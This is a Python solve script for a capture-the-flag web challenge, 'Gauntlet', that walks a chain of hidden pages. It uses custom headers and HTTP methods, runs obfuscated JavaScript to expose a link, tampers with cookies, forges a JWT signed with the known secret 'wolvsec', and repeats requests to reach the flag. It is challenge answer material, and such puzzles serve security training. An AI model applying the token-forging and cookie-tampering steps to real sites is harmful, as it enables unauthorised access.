import jwt
import os
import requests
import subprocess
import sys

URL = os.getenv('CHAL_URL') or 'https://gauntlet-okntin33tq-ul.a.run.app/'
# URL = 'http://localhost:5000'


PAGE1 = '/hidden9136234145526'
PAGE2 = '/hidden0197452938528'
PAGE3 = '/hidden5823565189534225'
PAGE4 = '/hidden5912455200155329'
PAGE5 = '/hidden3964332063935202'
PAGE6A = '/hidden5935562908234559'
PAGE6B = '/hidden5935562908234558'
PAGE6C = '/hidden5935562908234557'
PAGE7 = '/hidden82008753458651496'
PAGE8 = '/hidden00127595382036382'
PAGE9 = '/hidden83365193635473293'
PAGE10 = '/flag620873537329327365'


def findPage1OnHomePage():
    response = requests.get(URL)
    if PAGE1 not in response.text:
        print('Failed to find page1')
        sys.exit(1)


def findPage2OnPage1():
    URL_PAGE1 = URL + PAGE1
    response = requests.get(URL_PAGE1)
    if PAGE2 in response.text:
        print('page2 link should not have been found yet')
        sys.exit(1)

    headers = {'wolvsec': 'rocks'}
    response = requests.get(URL_PAGE1, headers=headers)

    if PAGE2 not in response.text:
        print('Failed to find page2')
        sys.exit(1)


def findPage3OnPage2():
    URL_PAGE2 = URL + PAGE2
    response = requests.get(URL_PAGE2)
    if PAGE3 in response.text:
        print('page3 link should not have been found yet')
        sys.exit(1)

    response = requests.options(URL_PAGE2)

    if PAGE3 not in response.text:
        print('Failed to find page3')
        sys.exit(1)

def findPage4OnPage3():
    URL_PAGE3 = URL + PAGE3
    response = requests.get(URL_PAGE3)

    if PAGE4 in response.text:
        print('page4 link should not have been found yet')
        sys.exit(1)

    response = requests.get(URL_PAGE3 + '?wolvsec=c%23%2Bl')

    if PAGE4 not in response.text:
        print('Failed to find page4')
        sys.exit(1)


def findPage5OnPage4():
    URL_PAGE4 = URL + PAGE4
    response = requests.get(URL_PAGE4)
    if PAGE5 in response.text:
        print('page5 link should not have been found yet')
        sys.exit(1)

    # Content-Type of 'application/x-www-form-urlencoded' will be automatically added
    data = {'wolvsec': 'rocks'}
    response = requests.post(URL_PAGE4, data=data)

    if PAGE5 not in response.text:
        print('Failed to find page5')
        sys.exit(1)


def findPage6OnPage5():
    URL_PAGE5 = URL + PAGE5
    response = requests.get(URL_PAGE5)
    if PAGE6A in response.text:
        print('page6 link should not have been found')
        sys.exit(1)

    lines = response.text.split('\n')
    function_line = None
    for line in lines:
        if 'function' in line:
            function_line = line
            break

    # This is a bit of a hack and is not perfect.
    #
    # We take the script from PAGE6A and "run" it in node.js.
    # This fails like we expect it to since we are not running it in a browser.
    # However, the failure includes the "original code " which was obfuscated
    # to produce the code on PAGE6A.
    #
    # We assert that this "original code" includes the link to PAGE6A
    #
    # This is not perfect because it doesn't assert that a browser running this
    # "original code" would actually add PAGE6A to the DOM of that page.
    process = subprocess.Popen(["node", '-e', function_line], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output = process.communicate()[1]

    if PAGE6A not in output.decode():
        print('Failed to find page6A')


def findPage7OnPage6():
    response6A = requests.get(URL + PAGE6A, allow_redirects=False)

    if response6A.status_code != 302:
        print('page6A did not redirect')
        sys.exit(1)

    location_value = response6A.headers.get('Location')
    if location_value != PAGE6B:
        print('page6A did not redirect to page6B')
        sys.exit(1)


    response6B = requests.get(URL + PAGE6B, allow_redirects=False)

    if response6B.status_code != 302:
        print('page6B did not redirect')
        sys.exit(1)

    location_value = response6B.headers.get('Location')
    if location_value != PAGE6C:
        print('page6B did not redirect to page6C')
        sys.exit(1)

    if PAGE7 not in response6B.text:
        print('Failed to find page7')
        sys.exit(1)

    response6C = requests.get(URL + PAGE6C)

    if response6C.status_code != 200:
        print('Unexpected response code from page6C')
        sys.exit(1)


def findPage8OnPage7():
    URL_PAGE7 = URL + PAGE7
    response = requests.get(URL_PAGE7)
    if PAGE8 in response.text:
        print('page8 link should not have been found yet')
        sys.exit(1)

    cookies = {'cookie-counter': "500"}
    response = requests.get(URL_PAGE7, cookies=cookies)

    if PAGE8 not in response.text:
        print('Failed to find page8')
        sys.exit(1)


def findPage9OnPage8():
    URL_PAGE8 = URL + PAGE8
    response = requests.get(URL_PAGE8)
    if PAGE9 in response.text:
        print('page9 link should not have been found yet')
        sys.exit(1)

    jwtData = {"counter": 499}
    cookie_value = jwt.encode(jwtData, 'wolvsec', algorithm='HS256')

    cookies = {'jwt-cookie-counter': cookie_value}
    response = requests.get(URL_PAGE8, cookies=cookies)

    if PAGE9 in response.text:
        print('page9 link should not have been found yet')
        sys.exit(1)


    jwtData = {"counter": 500}
    cookie_value = jwt.encode(jwtData, 'wolvsec', algorithm='HS256')

    cookies = {'jwt-cookie-counter': cookie_value}
    response = requests.get(URL_PAGE8, cookies=cookies)

    if PAGE9 not in response.text:
        print('Failed to find page9')
        sys.exit(1)


def findPage10OnPage9():
    URL_PAGE9 = URL + PAGE9
    response = requests.get(URL_PAGE9)
    if PAGE10 in response.text:
        print('page10 link should not have been found yet')
        sys.exit(1)

    # a "session" will manage cookies for you automatically
    session = requests.session()

    for i in range(1000):
        if i % 100 == 0:
            print(f'page9 count: {i}')
        session.get(URL_PAGE9)

    response = session.get(URL_PAGE9)
    if PAGE10 not in response.text:
        print('Failed to find page10')
        sys.exit(1)

def findFlagOnPage10():
    URL_PAGE10 = URL + PAGE10

    response = requests.get(URL_PAGE10)
    if 'wctf{' not in response.text:
        print('Failed to find flag on page 10')
        sys.exit(1)


findPage1OnHomePage()
findPage2OnPage1()
findPage3OnPage2()
findPage4OnPage3()
findPage5OnPage4()
findPage6OnPage5()
findPage7OnPage6()
findPage8OnPage7()
findPage9OnPage8()
findPage10OnPage9()
findFlagOnPage10()

print('SOLVED: GAUNTLET challenge')

